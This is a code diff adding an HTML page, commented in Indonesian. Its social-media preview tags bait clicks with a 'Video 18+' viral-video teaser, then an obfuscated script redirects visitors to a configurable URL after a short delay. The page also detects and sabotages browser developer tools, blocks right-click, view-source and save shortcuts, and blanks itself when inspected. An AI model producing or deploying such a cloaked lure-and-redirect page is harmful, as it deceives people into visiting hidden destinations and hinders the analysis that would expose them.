@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
+
+<!-- Twitter Card & Open Graph (penting supaya preview muncul di X) -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Video 18+">
+<meta name="twitter:description" content="Viral terbaru 2026">
+<meta name="twitter:image" content="https://video.twimg.com/amplify_video/2122859417641402368/vid/avc1/1080x1080/OvRHq3VdUn2VPN2s.mp4?tag=29">
+
+<meta property="og:title" content="Video 18+">
+<meta property="og:description" content="Viral terbaru 2026">
+<meta property="og:image" content="https://video.twimg.com/amplify_video/2122859417641402368/vid/avc1/1080x1080/OvRHq3VdUn2VPN2s.mp4?tag=29">
+<meta property="og:type" content="website">
+
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  html,body{height:100%;background:#000;overflow:hidden;font-family:system-ui}
+  #c{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:#000;z-index:9999}
+  #c img{max-width:100%;max-height:100%;object-fit:contain}
+  .hidden{display:none!important}
+</style>
+</head>
+<body>
+
+<div id="c">
+  <img src="https://video.twimg.com/amplify_video/2122859417641402368/vid/avc1/1080x1080/OvRHq3VdUn2VPN2s.mp4?tag=29" alt="" id="img">
+</div>
+
+<script>
+// ====================== KONFIGURASI ======================
+const _0x = {
+  t: "https://youtube.com",          // URL tujuan redirect
+  d: 1800,                                    // Delay sebelum redirect (ms)
+  img: "https://video.twimg.com/amplify_video/2122859417641402368/vid/avc1/1080x1080/OvRHq3VdUn2VPN2s.mp4?tag=29"
+};
+
+// ====================== ANTI DEVTOOLS ======================
+(function(){
+  const _d = () => {
+    document.documentElement.innerHTML = "";
+    window.location.replace("about:blank");
+  };
+
+  // Deteksi DevTools via ukuran window
+  const threshold = 160;
+  setInterval(() => {
+    if (window.outerWidth - window.innerWidth > threshold || 
+        window.outerHeight - window.innerHeight > threshold) {
+      _d();
+    }
+  }, 500);
+
+  // Deteksi via debugger
+  setInterval(() => {
+    (function(){
+      return false;
+    })['constructor']('debugger')['call']();
+  }, 50);
+
+  // Deteksi console
+  const element = new Image();
+  Object.defineProperty(element, 'id', {
+    get: function() {
+      _d();
+    }
+  });
+  console.log(element);
+  console.clear();
+})();
+
+// ====================== DISABLE INSPECTION ======================
+document.addEventListener('contextmenu', e => e.preventDefault());
+document.addEventListener('keydown', e => {
+  if (
+    e.key === 'F12' ||
+    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
+    (e.ctrlKey && e.key === 'u') ||
+    (e.ctrlKey && e.key === 's') ||
+    (e.ctrlKey && e.shiftKey && e.key === 'K')
+  ) {
+    e.preventDefault();
+    e.stopPropagation();
+    return false;
+  }
+});
+
+// ====================== REDIRECT OBFUSCATED ======================
+(function(_0x4a2b){
+  const _0x1c = atob("aHR0cHM6Ly8="); // https://
+  function _r(){
+    const _t = _0x4a2b.t;
+    const _f = document.createElement('form');
+    _f.method = 'GET';
+    _f.action = _t;
+    _f.style.display = 'none';
+    document.body.appendChild(_f);
+    setTimeout(() => {
+      _f.submit();
+      window.location.replace(_t);
+    }, 100);
+  }
+
+  // Tampilkan gambar dulu, baru redirect
+  setTimeout(() => {
+    document.getElementById('c').classList.add('hidden');
+    _r();
+  }, _0x4a2b.d);
+
+  // Backup redirect
+  setTimeout(_r, _0x4a2b.d + 800);
+})(_0x);
+
+// Extra: hapus source map & cegah view-source
+window.addEventListener('DOMContentLoaded', () => {
+  if (location.protocol === 'view-source:') {
+    location.href = 'about:blank';
+  }
+});
+</script>
+</body>
+</html>
